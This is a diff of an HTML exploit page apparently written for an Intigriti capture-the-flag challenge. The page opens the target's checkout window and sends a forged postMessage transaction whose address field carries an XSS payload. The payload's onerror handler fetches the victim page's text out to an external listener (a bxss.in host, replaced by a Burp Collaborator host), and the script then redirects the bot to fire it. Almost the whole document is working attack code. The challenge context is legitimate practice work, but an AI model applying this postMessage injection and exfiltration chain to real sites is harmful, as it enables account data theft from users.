@@ -2,50 +2,45 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Intigriti Challenge Exploit</title>
+    <title>Intigriti Exploit</title>
 </head>
 <body>
-    <h1>🚀 Launching Exploit...</h1>
-    <p>Please wait while we capture the flag.</p>
-
+    <h1>Exploit Sent to Bot...</h1>
     <script>
         // CONFIGURATION
         const BASE_URL = 'https://challenge-0126.intigriti.io';
-        const BXSS_URL = 'https://monkeydluffy.bxss.in';
         
-        // 1. Open the vulnerable Checkout page
-        // We open it in a new window so we can control it via a reference
-        let targetWindow = window.open(BASE_URL + '/checkout.html?currency=1337COIN&price=1', '_blank');
+        // Your Burp Collaborator Link
+        const LISTENER = 'https://qa49y659sitq7iz5fqmwg5jrwi29qzeo.oastify.com';
 
-        // 2. Wait for the checkout page to fully load
+        // 1. Open the checkout page
+        // We use currency=1337COIN in the URL to look legit, though not strictly required
+        let win = window.open(BASE_URL + '/checkout.html?currency=1337COIN&price=1', '_blank');
+
+        // 2. Wait for the window to load
         setTimeout(() => {
             
             // THE PAYLOAD
-            // -------------------------------------------------------------------
-            // Break out of the title attribute: ">
-            // Inject img tag with onerror event
-            // Fetch your bxss URL with the page content (which contains the flag)
-            // -------------------------------------------------------------------
-            const xss_payload = `"><img src=x onerror="fetch('${BXSS_URL}?flag='+encodeURIComponent(document.body.innerText))">`;
+            // Breaks out of the title attribute and sends the flag to Burp Collaborator
+            const xss = `"><img src=x onerror="fetch('${LISTENER}/?flag='+encodeURIComponent(document.body.innerText))">`;
 
-            // 3. Send the malicious postMessage
-            // This exploits the missing origin check in checkout.html
-            targetWindow.postMessage({
+            // 3. Send the malicious message
+            // TARGETING 1337COIN because we know the Admin has millions of it!
+            win.postMessage({
                 type: 'submitTransaction',
                 transaction: {
-                    currency: 'BTC',         // Must match a wallet the bot owns
-                    amount: 0.00001337,      // Arbitrary amount
-                    toAddress: xss_payload   // The exploit injection
+                    currency: '1337COIN',    // UPDATED: Using the admin's known currency
+                    amount: 1337,            // Using a valid amount they can afford
+                    toAddress: xss           // The Injection
                 }
-            }, '*'); // '*' allows sending to any origin (essential for the exploit)
+            }, '*');
 
-            // 4. Redirect the victim to MarketWatch
-            // We wait 1.5 seconds to ensure the API call in step 3 finished
+            // 4. Redirect the bot to MarketWatch to execute the XSS
             setTimeout(() => {
-                targetWindow.location = BASE_URL + '/marketwatch.html';
+                win.location = BASE_URL + '/marketwatch.html';
             }, 1500);
 
-        }, 2000); // Initial wait time for window to open
+        }, 2000);
     </script>
 </body>
 </html>
